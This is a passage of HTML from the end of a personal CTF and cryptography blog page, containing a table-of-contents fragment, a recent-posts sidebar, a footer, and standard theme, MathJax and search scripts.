href="#%E6%9B%BC%E6%B3%A2%E6%9B%BC%E6%B3%A2%E6%9B%BC%E6%B3%A2"><span class="toc-text">曼波曼波曼波</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WARMUP"><span class="toc-text">WARMUP</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/10/%E8%BF%91%E4%BC%BC%E5%85%AC%E7%BA%A6%E6%95%B0%E9%97%AE%E9%A2%98-ACD/" title="近似公约数问题 (ACD)">近似公约数问题 (ACD)</a><time datetime="2025-08-10T14:33:10.000Z" title="Created 2025-08-10 22:33:10">2025-08-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/30/%E6%95%A3%E9%A2%98-1/" title="散题(1)">散题(1)</a><time datetime="2025-07-30T03:34:06.000Z" title="Created 2025-07-30 11:34:06">2025-07-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/07/DASCTF-2025%E4%B8%8A%E5%8D%8A%E5%B9%B4%E8%B5%9BCrypto-%E9%83%A8%E5%88%86Write-Up/" title="DASCTF 2025上半年赛Crypto部分Write Up">DASCTF 2025上半年赛Crypto部分Write Up</a><time datetime="2025-07-07T15:26:55.000Z" title="Created 2025-07-07 23:26:55">2025-07-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/07/%E4%B8%A4%E5%B9%B4%E7%9A%84%E5%9B%9E%E9%A1%BE%E4%B8%8E%E6%8E%A2%E7%B4%A2/" title="两年的回顾与探索">两年的回顾与探索</a><time datetime="2025-07-07T12:32:48.000Z" title="Created 2025-07-07 20:32:48">2025-07-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/07/LWE/" title="LWE">LWE</a><time datetime="2025-07-07T11:11:21.000Z" title="Created 2025-07-07 19:11:21">2025-07-07</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By Triode</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [['$', '$'], ['\\(', '\\)']],
      tags: 'ams'
    },
    chtml: {
      scale: 1.1
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, '']
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.min.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typesetPromise()
}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>